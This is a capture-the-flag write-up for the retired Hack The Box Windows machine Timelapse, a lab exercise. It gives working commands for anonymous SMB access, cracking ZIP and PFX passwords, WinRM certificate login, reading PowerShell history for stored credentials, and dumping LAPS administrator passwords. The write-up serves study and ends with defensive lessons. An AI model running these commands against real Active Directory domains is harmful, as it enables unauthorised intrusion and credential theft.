---
machine: Timelapse
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Certificates
state: Retired
tags: [smb, pfx, evil-winrm, laps, active-directory]
---

# Timelapse — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

A domain with **anonymous SMB**: `\\support\Dev` holds `winrm_backup.zip`, cracked with a wordlist and containing a **PFX** (`legacyy_dev_auth.pfx`) with another password. Once key and certificate are extracted, **WinRM over 5986** authenticates as `legacyy`. His `ConsoleHost_history.txt` stores **`svc_deploy`**'s password; that user is in **`LAPS_Readers`** and reads the Administrator password.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
53/dns, 88/kerberos, 135, 139/445 smb, 389/636 ldap, 5986/ssl winrm, 9389
```

```bash
smbclient -N -L //<IP>/
# support
smbclient -N //<IP>/support
# Dev/winrm_backup.zip , HelpDesk/
```

## Access

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
unzip winrm_backup.zip            # legacyy_dev_auth.pfx
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy.key
evil-winrm -i <IP> -S -c legacyy.crt -k legacyy.key
```

## Escalation

1. **PowerShell history** of that user: `svc_deploy` credentials.

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2. **LAPS**: `svc_deploy` belongs to `LAPS_Readers`.

```bash
evil-winrm -i <IP> -S -u svc_deploy -p '<password>'
impacket-GetLAPSPassword -dc-ip <IP> 'timelapse.htb/svc_deploy:<password>'
# or: cme ldap <IP> -u svc_deploy -p '<password>' -M laps
```

3. **WinRM** as `administrator` with the LAPS password: `C:\Users\TRX\Desktop\root.txt`.

## Pitfalls

- **Two cracks**: the ZIP and the PFX use different passwords; without the second there is no private key.
- **`-S` is mandatory**: WinRM listens on 5986 (TLS); without `-S` it fails.
- **History permissions**: read it as `legacyy`, before switching user.

## Lessons

- An anonymous SMB share with backups is a common initial access.
- A PFX is a full identity: certificate plus private key.
- PowerShell history leaks passwords in clear text.
- LAPS is only as safe as the read group's membership.
